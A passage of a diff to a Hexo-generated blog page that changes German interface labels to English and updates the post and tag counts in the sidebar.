-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posted on</span>
               
               <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-10T00:18:03+08:00">
                 2017-10-10
@@ -723,8 +2411,8 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">3</span>
-                  <span class="site-state-item-name">Artikel</span>
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">posts</span>
                 </a>
               </div>
             
@@ -736,8 +2424,8 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">1</span>
-                  <span class="site-state-item-name">Tags</span>
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">tags</span>
                 
               </div>
             
@@ -785,7 +2473,7 @@
 </div>
 
 
-  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
 
 
 
